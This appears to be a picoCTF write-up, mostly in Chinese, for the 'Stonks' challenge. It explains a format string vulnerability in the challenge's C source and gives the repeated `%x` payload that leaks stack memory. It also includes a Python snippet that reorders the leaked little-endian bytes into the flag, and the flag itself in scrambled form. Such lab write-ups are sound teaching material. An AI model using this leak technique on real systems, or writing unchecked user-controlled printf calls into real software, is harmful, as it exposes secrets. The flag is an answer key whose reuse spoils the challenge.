# Stonks

## Inforamtion

### Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 53437

### Hints

1. Okay, maybe I'd believe you if you find my API key.

## Solution

- 觀察原始碼 (source code)時會發現，`buy_stonks(Portfolio *p)` 中以下片段存在漏洞。
    ```c
    	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
    ```

- 其中最後一個 `printf(user_buf)` 存在 **Format String Vulnerability**，當使用者在 `scanf("%300s", user_buf)` 中輸入類似於"%d"、"%x"、"%p"等關鍵字時，會使得 `printf()` 回將其當作真正的關鍵字參數進行執行，可能導致資料洩漏的問題。
    - [CWE-134: Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html)

- 可以發現題目目標(api)就存在於漏洞程式片段的上方區域，表示我們可以透過 **Format String Vulnerability** 將其資料洩漏出來。
    ```c
    if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
    ```

- 先想辦法觸發到該程式片段。
    ```sh
    Welcome back to the trading app!

    What would you like to do?
    1) Buy some stonks!
    2) View my portfolio
    1
    Using patented AI algorithms to buy stonks
    Stonks chosen
    What is your API token?
    ```

- 透過以下 payload 進行輸入，觸發 **Format String Vulnerability**，使得參數後方其他位置資料洩漏。
    ```
    %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x.....
    ```

- 獲取輸出的資料後，將其透過 ASCII 編碼的方法轉換為Text。
	- [Hex to ASCII Text String Converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

- 因為是 **little endian**的關係，需再將位置作轉置。
	```py
	#! /usr/bin/env python

	galf = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52}'
	for i in range(0, len(galf)-1, 4):
		print(galf[i+3], galf[i+2], galf[i+1], galf[i],sep='',end='')
	# patch '}'
	print('}')
	```